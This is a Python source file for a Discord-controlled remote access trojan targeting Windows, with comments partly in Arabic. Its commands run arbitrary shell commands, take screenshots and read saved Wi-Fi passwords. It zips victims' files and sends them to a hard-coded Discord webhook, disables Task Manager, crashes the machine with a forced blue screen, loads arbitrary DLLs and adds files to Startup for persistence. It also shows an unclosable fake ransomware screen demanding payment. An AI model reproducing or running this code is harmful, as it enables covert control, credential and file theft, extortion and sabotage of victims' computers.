import discord
from discord.ext import commands 
from colorama import Fore, Style, init
import os
import subprocess
import requests
import ctypes
import platform
import time 
import pyautogui
import zipfile
import webbrowser
from tkinter import *
from tkinter import messagebox
import subprocess, os, sys, base64, winreg as reg
import threading
intents = discord.Intents.default()
intents.message_content = True
client = commands.Bot(command_prefix="!" , intents = intents) #verify the discorde command
################################################################################################################
################################################################################################################

helpmenu = """ 

-> !helpme                             : show this messege
-> !uhere                              : replay to you 
-> !changewallpaper                    : to chnage the wallpaper to hacked wallpaper
-> !mss                                : send message into the sendbox
-> !shell                              : to run commands throu the cmd 
-> !sysinfo                            : to get information about the target machin 
-> !bluescreen                         : to crash the machine
-> !screenshot                         : take screen shot
-> !kill                               : to kill session
-> !download                           : to download files or folders
-> !loadll                             : load dll file into the target machine
-> !logff                              : log out from the current user
-> !wifo                               : to get all info about wifis and profiles of wifies
-> !openlink                           : to open link in webrowser in user interface '!openlink google.com' 
-> !tasklist                           : to get task list with pid of the tasks 
-> !enbtaskmgr                         : enable task manager
-> !distaskmgr                         : disable task manager
-> !hide                               : hide file with path
-> !unhide                             : unhide file with path 
-> !killtask                           : to kill process or task with pid of it (use tasklist to get the pid)
-> !restart                            : restart the target machine computer 
-> !shutdown                           : shut down the computer 
-> !fronsamware                        : open fake screen like ronsamware for scared
-> !upload                             : upload file with (!upload + the file )
-> !cd                                 : change the directory to ur path choise
-> !tostartup                          : send file to start up (!tostartup "path of the file or name of it")
"""
################################################################################################################
################################################################################################################
@client.event
#event when he start he send message
async def on_ready():
    channel = client.get_channel()  # put here discord channel id 
    if channel:
        embed = discord.Embed(description=f"**[+1]**", color=0x460496)
        embed.set_author(name="𝓝𝓮𝔀 𝓢𝓮𝓼𝓼𝓲𝓸𝓷 💤")
        await channel.send(embed=embed)
@client.event
async def on_message(message):
    
    print(f"Message from {message.author} ({'bot' if message.author.bot else 'user'}): {message.content}")

   
    await client.process_commands(message)
################################################################################################################
################################################################################################################
import shutil
@client.command()

async def tostartup(ctx, file_path):
    appdata = os.environ.get('APPDATA')
    if not appdata:
        embed = discord.Embed(description=f"**خطأ: لم أتمكن من الحصول على مسار APPDATA.**")
        embed.set_author(name="Failed")
        embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
        await ctx.send(embed=embed)
        return
    startup_folder = os.path.join(appdata, r"Microsoft\Windows\Start Menu\Programs\Startup")
    try:
        shutil.move(file_path, startup_folder)
        embed = discord.Embed(description=f"**تم نقل الملف إلى مجلد بدء التشغيل Startup بنجاح!**")
        embed.set_author(name="Succes 💤")
        embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(description=f"**حدث خطأ أثناء النقل:** {e}")
        embed.set_author(name="Failed To Move")
        embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
        await ctx.send(embed=embed)
@client.command()
async def cd(ctx, *, path):
    global current_dir
    try:
        new_path = os.path.abspath(os.path.join(current_dir, path))
        if os.path.exists(new_path) and os.path.isdir(new_path):
            current_dir = new_path
            os.chdir(current_dir)  # مهم جداً
            embed = discord.Embed(description=f"**Changed directory to:**\n {current_dir}", color=0x460496)
            embed.set_author(name="Change Directory💤")
            embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(description=f"**Invalid directory**", color=0x460496)
            embed.set_author(name="Invalid Directory Error")
            embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
            await ctx.send(embed=embed)
            
    except Exception as e:
        embed = discord.Embed(description=f"**Error:**\n{str(e)}", color=0x460496)
        embed.set_author(name="Error")
        await ctx.send(embed=embed)

@client.command()
async def fronsamware(ctx, cod):
    import os, sys, base64
    from tkinter import Tk, Label, Entry, Frame, Button, PhotoImage, CENTER, messagebox

    def rsrc(p):
        try:
            return os.path.join(sys._MEIPASS, p)
        except Exception:
            return os.path.join(os.path.abspath("."), p)

    def check_key():
        if entry.get() == cod:
            win.destroy()
        else:
            messagebox.showerror("Error", "Incorrect key 😎")

    ACC = "#0059FF"  
    BG = "black"    

    win = Tk()
    win.title("System Alert")
    win.attributes("-fullscreen", True)
    win.configure(bg=BG)
    win.protocol("WM_DELETE_WINDOW", lambda: None)  
    win.attributes("-topmost", True)  
    win.focus_force()
    win.lift()

    def force_focus():
        win.lift()
        win.focus_force()
        win.after(200, force_focus)

    force_focus()

    MSG = """
    All ur files get crypted so pay me 🔓 like a dog to restor ur files or lose it 🎭
    If you decide to restart! ur computer your system will be down
    so try to do it if your men  
    @XZ3ro🚬
    """
    lbl = Label(win, font=("Courier", 24), bg=BG, fg=ACC, justify="center")
    lbl.place(relx=0.5, rely=0.72, anchor="n")
    index = 0

    def typer():
        nonlocal index
        if index < len(MSG):
            lbl.config(text=lbl.cget("text") + MSG[index])
            index += 1
            win.after(40, typer)

    time_left = 3600 
    time_lbl = Label(win, font=("Courier", 24, "bold"), bg=BG, fg=ACC,
                     highlightbackground=ACC, highlightcolor=ACC, highlightthickness=2)
    time_lbl.place(relx=0.5, rely=0.1, anchor="center")

    def update_timer():
        nonlocal time_left
        if time_left >= 0:
            mins, secs = divmod(time_left, 60)
            hours, mins = divmod(mins, 60)
            time_lbl.config(text=f"{hours:02d}:{mins:02d}:{secs:02d}")
            time_left -= 1
            win.after(1000, update_timer)

    try:
        img = PhotoImage(file=rsrc("image.png"))
        img = img.subsample(3, 3)
        Label(win, image=img, width=204, height=223,
              bg=BG, highlightthickness=2,
              highlightbackground=ACC, highlightcolor=ACC).place(
              relx=0.5, rely=0.3, anchor=CENTER)
    except:
        pass

    Label(win, text="Enter Decryption Key", font=("Ink Free", 20, "bold"),
          bg=BG, fg=ACC).place(relx=0.5, rely=0.5, anchor="center")

    entry = Entry(win, font=("Ink Free", 20, "bold"), bg=BG, fg=ACC,
                  highlightcolor=ACC, highlightthickness=2, highlightbackground=ACC,
                  justify="center")
    entry.place(relx=0.5, rely=0.55, anchor=CENTER)

    frame = Frame(win, bg=ACC, bd=0)
    frame.place(relx=0.5, rely=0.65, anchor="center", width=124, height=65)

    press_enter = Button(frame, text="Submit", font=("Arial", 24, "bold"),
                         bg="black", fg=ACC, activebackground="black",
                         activeforeground=ACC, width=6, height=0, bd=0,
                         relief="flat", command=check_key)
    press_enter.place(relx=0.5, rely=0.498, anchor="center")
    win.bind('<Return>', lambda e: check_key())

    # ---------- تشغيل ----------
    update_timer()
    typer()
    win.mainloop()
    embed = discord.Embed(description=f"**Fsomware Showed With Succes ❤️‍🔥**", color=0x460496)
    embed.set_author(name="Done!")
    embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
    await ctx.send(embed=embed)
    
@client.command()
async def upload(ctx):
    # تأكد أن هناك مرفق في الرسالة
    if ctx.message.attachments:
        attachment = ctx.message.attachments[0]
        save_path = os.path.join(os.getcwd(), attachment.filename)
        await attachment.save(save_path)
        embed = discord.Embed(description=f"**File** {attachment.filename} **uploaded successfully to** `{save_path}`", color=0x460496)
        embed.set_author(name="File Uploaded With Succes💤")
        embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
        await ctx.send(embed=embed)
    else:
        #hereeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee 242
        embed = discord.Embed(description=f"Please attach a file to upload", color=0x460496)
        embed.set_author(name="Warning!")
        embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
        await ctx.send(embed=embed)
@client.command()
async def shutdown(ctx):
    subprocess.call("shutdown" , shell=True , text=True)
    embed = discord.Embed(description=f"***Targed Shutdown With Succes!**", color=0x460496)
    embed.set_author(name="Shut Down💤")
    embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
    await ctx.send(embed=embed)
@client.command()
async def restart(ctx):
    subprocess.call("shutdown -r" , shell=True , text=True)
    embed = discord.Embed(description=f"**Target Restarted With Succes!**", color=0x460496)
    embed.set_author(name="Restart💤")
    embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
    await ctx.send(embed=embed)
@client.command()
async def killtask(ctx , pid):
    subprocess.call(f"taskkill /PID {pid}" , shell=True , text=True)
    embed = discord.Embed(description=f"**Task Killed With Succes PID:**{pid}", color=0x460496)
    embed.set_author(name="Task Kill💤")
    embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
    await ctx.send(embed=embed)

webhook_url = "https://discord.com/api/webhooks/1402282005927825418/ic5cJUjYNIirNPs40vcp-mX8KmJ6vCHTfAjxKynFbbbgwZYNnf4F_bdQgURpCXTIX00I"
def zip_folder_or_file(path, zip_name="UrFile.zip"):
    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        if os.path.isdir(path):
            for root, dirs, files in os.walk(path):
                for file in files:
                    full_path = os.path.join(root, file)
                    arcname = os.path.relpath(full_path, os.path.dirname(path))
                    zipf.write(full_path, arcname)
        else:
            zipf.write(path, os.path.basename(path))
    return zip_name

@client.command()
async def hide(ctx, *, path):
    try:
        if os.path.exists(path):
            subprocess.run(f'attrib +h "{path}"', shell=True, check=True)
            embed = discord.Embed(description=f"**Done File Hidden With Path :**{path}", color=0x460496)
            embed.set_author(name="Hidden File")
            embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(description=f"**File Path Not Exist** {path}", color=0x460496)
            embed.set_author(name="Error")
            embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
            await ctx.send(embed=embed)
    except Exception as e:
            embed = discord.Embed(description=f"**Got Error With Hide Command** {e}", color=0x460496)
            embed.set_author(name="Hidden Error")
            embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
            await ctx.send(embed=embed)

@client.command()
async def unhide(ctx, *, path):
    try:
        if os.path.exists(path):
            subprocess.run(f'attrib -h "{path}"', shell=True, check=True)
            embed = discord.Embed(description=f"**The File Get Unhidded With Succes!** {path}", color=0x460496)
            embed.set_author(name="Unhidde File")
            embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(description=f"**File Not Exist** {path}", color=0x460496)
            embed.set_author(name="Error")
            embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
            await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(description=f"**Got Error With Unhidde Command** {e}", color=0x460496)
        embed.set_author(name="Unhide Error")
        embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
        await ctx.send(embed=embed)
@client.command()
async def distaskmgr(ctx):
    try:
        subprocess.run(
            r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f',
            shell=True, check=True
        )
        embed = discord.Embed(description=f"**The Task Manager Disabled With Succed!😌**", color=0x460496)
        embed.set_author(name="TaskManager💤")
        embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(description=f"**We Got Error While Disabling The Task Manager** {e}", color=0x460496)
        embed.set_author(name="TaskManager Error")
        embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
        await ctx.send(embed=embed)
@client.command()
async def enbtaskmgr(ctx):
    try:
        subprocess.run(
            r'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /f',
            shell=True, check=True
        )
        embed = discord.Embed(description=f"**Task Manager Enabled With Succed!😌**", color=0x460496)
        embed.set_author(name="TaskManager")
        embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(description=f"**Got Error While Enabling Task Manager**", color=0x460496)
        embed.set_author(name="TaskManager Error")
        embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
        await ctx.send(embed=embed)
@client.command()
async def tasklist(ctx):
    tasklist_output = subprocess.check_output('tasklist', shell=True, text=True)
    
    for chunk in [tasklist_output[i:i+1900] for i in range(0, len(tasklist_output), 1900)]:
        embed = discord.Embed(description=f"```{chunk}```", color=0x460496)
        embed.set_author(name="TaskList❤️‍🔥")
        embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
        await ctx.send(embed=embed)

@client.command()
async def wifo(ctx):
    try:
        profiles_output = subprocess.check_output(
            'netsh wlan show profiles', shell=True, text=True, encoding='utf-8'
        )
        profiles = []
        for line in profiles_output.split('\n'):
            if "All User Profile" in line or "كل ملفات تعريف المستخدم" in line:
                profile_name = line.split(":")[-1].strip()
                profiles.append(profile_name)

        if not profiles:
            embed = discord.Embed(description=f"**We Didint Get Any Saved Networks😔**", color=0x460496)
            embed.set_author(name="Failed😔")
            embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
            await ctx.send(embed=embed)
            return

        result = ""
        for profile in profiles:
            try:
                wifi_details = subprocess.check_output(
                    f'netsh wlan show profile name="{profile}" key=clear',
                    shell=True, text=True, encoding='utf-8'
                )
                password = ""
                for detail_line in wifi_details.split('\n'):
                    if "Key Content" in detail_line or "محتوى المفتاح" in detail_line:
                        password = detail_line.split(":")[-1].strip()
                        break
                result += f"SSID: `{profile}`\nPassword: `{password if password else 'لا يوجد/غير معروف'}`\n\n"
            except Exception as e:
                result += f"SSID: `{profile}`\nPassword: `خطأ في القراءة`\n\n"

        for chunk in [result[i:i+1900] for i in range(0, len(result), 1900)]:
            embed = discord.Embed(description=f"{chunk}", color=0x460496)
            embed.set_author(name="Networks Informations")
            embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
            await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(description=f"**Failed To Get Networks With Error** {e}", color=0x460496)
        embed.set_author(name="Network Error")
        embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
        await ctx.send(embed=embed)                                                                                   
############################################################################################################################
@client.command()
async def logff(ctx):
    embed = discord.Embed(description=f"**Target Will Log Out Make Sure Ur Cute In The Startup🙏**", color=0x460496)
    embed.set_author(name="LogOff")
    embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
    await ctx.send(embed=embed)
    os.system('shutdown -L')
@client.command()
async def download(ctx, *, path):
    try:
        zip_name = "UrFile.zip"
        zip_path = zip_folder_or_file(path, zip_name=zip_name)

        with open(zip_path, "rb") as f:
            files = {
                "file": (zip_name, f)
            }
            res = requests.post(webhook_url, files=files)

        os.remove(zip_path)  # تنظيف الملف

        if res.status_code in [200, 204]:
            embed = discord.Embed(description=f"**File Was Sended With Success🚬**", color=0x460496)
            embed.set_author(name="Files")
            embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(description=f"**Sumthing Went Wrong :**{res.status_code} ", color=0x460496)
            embed.set_author(name="Download Error")
            embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
            await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(description=f"**Got Error While Sending The File :** {e}", color=0x460496)
        embed.set_author(name="Download Error")
        embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
        await ctx.send(embed=embed)
@client.command()
async def kill(ctx):
    embed = discord.Embed(description=f"**ShutDown Ur Cute With Succed❤️‍🔥**", color=0x460496)
    embed.set_author(name="ShutDown💤")
    embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
    await ctx.send(embed=embed)
    await client.close()
@client.command()
async def screenshot(ctx):
    image = pyautogui.screenshot()
    image.save("scr.png")
    file = discord.File("scr.png")
    await ctx.send(file=file)
    os.remove("scr.png")
@client.command()
async def openlink(ctx , url): 
    webbrowser.open(url)
    embed = discord.Embed(description=f"**Link Opened With Succed 😌🚬**", color=0x460496)
    embed.set_author(name="OpenLink💤")
    embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
    await ctx.send(embed=embed)
@client.command()
async def changewallpaper(ctx , image_url):
    def download_image(url, save_path):
        response = requests.get(url)
        if response.status_code == 200:
            with open(save_path, 'wb') as f:
                f.write(response.content)
            return True
        return False

    def set_wallpaper(image_path):
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)

    local_path = os.path.join(os.getenv('TEMP'), 'wallpaper.bmp')

    if download_image(image_url, local_path):
        set_wallpaper(local_path)
        embed = discord.Embed(description=f"**Wallpaper Chnaged With Succeed 🫢**", color=0x460496)
        embed.set_author(name="Wallpaper")
        embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
        await ctx.send(embed=embed)
    else:
        print("Failed to download the image")
@client.command()
async def uhere(ctx):
    embed = discord.Embed(description=f"**Ur Cute Was Greating U 😌❤️‍🔥**", color=0x460496)
    embed.set_author(name="Uhere💤")
    embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
    await ctx.send(embed=embed)
@client.command()
async def helpme(ctx):
    embed = discord.Embed(description=f"{helpmenu}", color=0x460496)
    embed.set_author(name="HelpMenu")
    embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
    await ctx.send(embed=embed)
@client.command()
async def mss(ctx ,*, mss):
    title = "Message From Xz3ro Cute"
    ctypes.windll.user32.MessageBoxW(0, mss , title, 0x40)
    embed = discord.Embed(description=f"**Message Displayed😌**", color=0x460496)
    embed.set_author(name="Message💤")
    embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
    await ctx.send(embed=embed)
current_dir = os.getcwd() 
@client.command()
async def shell(ctx, *, command):
    global current_dir
    try:

        os.chdir(current_dir)

        if command.strip().startswith("cd "):
            path = command[3:].strip()
            new_path = os.path.abspath(os.path.join(current_dir, path))
            if os.path.exists(new_path) and os.path.isdir(new_path):
                current_dir = new_path
                os.chdir(current_dir)  
                embed = discord.Embed(description=f"[+] Changed directory to:\n{current_dir}", color=0x460496)
                embed.set_author(name="Change Directory💤")
                embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
                await ctx.send(embed=embed)
            else:
                embed = discord.Embed(description=f"**Invalid directory**", color=0x460496)
                embed.set_author(name="Invalid Directory")
                embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
                await ctx.send(embed=embed)
        else:
            result = subprocess.check_output(
                command,
                shell=True,
                stderr=subprocess.STDOUT,
                text=True,
                cwd=current_dir 
            )
            if not result.strip():
                result = "[+] Command executed with no output."
            embed = discord.Embed(description=f" **Shell Result :**\n{result[:1900]}", color=0x460496)
            embed.set_author(name="Shell Resutl💤")
            embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
            await ctx.send(embed=embed)
    except subprocess.CalledProcessError as e:
        embed = discord.Embed(description=f"**Error:**\n{e.output[:1900]}", color=0x460496)
        embed.set_author(name="Error")
        embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
        await ctx.send(embed=embed)
        await ctx.send(f"")
    except Exception as e:
        embed = discord.Embed(description=f"**Unexpected error:**\n{str(e)}", color=0x460496)
        embed.set_author(name="Unexpected error💤")
        embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
        await ctx.send(embed=embed)
@client.command()
async def sysinfo(ctx):
    info = f"""
               OS {platform.system()} {platform.release()}
               Version {platform.version()}
               more infos : {platform.platform()}
               machine : {platform.machine()}
               procc name : {platform.processor()}
               hostname : {platform.node()}
               user : {os.getlogin()} 
    """
    embed = discord.Embed(description=f"**Informations OF The Target :** \n{info}", color=0x460496)
    embed.set_author(name="Target Info")
    embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
    await ctx.send(embed=embed)
@client.command()
async def bluescreen(ctx , mss):
    ctypes.windll.user32.MessageBoxW(0, mss , "From Z3ro", 0x40)
    time.sleep(0.4)
    from ctypes import windll
    from ctypes import c_int
    from ctypes import c_uint
    from ctypes import c_ulong
    from ctypes import POINTER
    from ctypes import byref

    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),
        c_uint(1),
        c_uint(0),
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B),
        c_ulong(0),
        nullptr,
        nullptr,
        c_uint(6),
        byref(c_uint())
    )
    embed = discord.Embed(description=f"**System Down With Succed 😌❤️‍🔥**", color=0x460496)
    embed.set_author(name="BlueScreen💤")
    embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
    await ctx.send(embed=embed)
@client.command()
async def loadll(ctx , path):
    my_dll = ctypes.CDLL(path)
    my_dll.my_function()
    embed = discord.Embed(description=f"**DLL Loaded With Succed😌**", color=0x460496)
    embed.set_author(name="DLL")
    embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
    await ctx.send(embed=embed)
@client.command()
async def pwd(ctx):
    pwdd = os.getcwd()
    embed = discord.Embed(description=f"**Ur Directory Was ❤️‍🔥:**\n {pwdd}", color=0x460496)
    embed.set_author(name="Pwd💤")
    embed.set_footer(text=f"Sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
    await ctx.send(embed=embed)

client.run("Discord Bot Token")
